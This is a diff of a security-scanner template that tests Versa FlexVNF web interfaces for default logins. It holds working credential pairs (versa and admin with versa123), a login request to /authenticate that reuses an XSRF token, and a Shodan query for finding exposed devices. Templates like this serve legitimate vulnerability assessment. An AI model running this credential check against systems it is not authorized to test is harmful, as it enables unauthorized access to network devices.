@@ -1,10 +1,9 @@
 id: versa-flexvnf-default-login
-
 info:
   name: Versa FlexVNF - Default Login
   author: c-sh0
   severity: high
-  description: Versa FlexVNF default login credentials were discovered.
+  description: Versa FlexVNF contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
   reference:
     - https://versa-networks.com/products/
   classification:
@@ -14,13 +13,39 @@ info:
     cpe: cpe:2.3:o:versa-networks:versa_operating_system:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "Flex VNF Web-UI"})
-    verified: true
     max-request: 4
+    product: versa_operating_system
+    shodan-query: title:"Flex VNF Web-UI"
     vendor: versa-networks
-  tags: default-login,versa,flexvnf,vuln
-
+    verified: true
+  tags: default-login,flexvnf,versa,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    extractors:
+      - group: 1
+        internal: true
+        name: xsrf_token
+        part: header
+        regex:
+          - '(?i)Set-Cookie: XSRF-TOKEN=([A-Za-z0-9_.-]+)'
+        type: regex
+    matchers:
+      - part: body
+        type: word
+        words:
+          - '{"username":"{{username}}","error":false}'
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    payloads:
+      password:
+        - versa123
+        - versa123
+      username:
+        - versa
+        - admin
+    raw:
       - |
         GET /authenticate HTTP/1.1
         Host: {{Hostname}}
@@ -31,34 +56,4 @@ http:
         CSRF-Token: {{xsrf_token}}
 
         {"username":"{{username}}","password":"{{password}}"}
-
-    attack: pitchfork
-    payloads:
-      username:
-        - versa
-        - admin
-      password:
-        - versa123
-        - versa123
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "{\"username\":\"{{username}}\",\"error\":false}"
-
-      - type: status
-        status:
-          - 200
-
-    extractors:
-      - type: regex
-        name: xsrf_token
-        group: 1
-        internal: true
-        part: header
-        regex:
-          - '(?i)Set-Cookie: XSRF-TOKEN=([A-Za-z0-9_.-]+)'
-
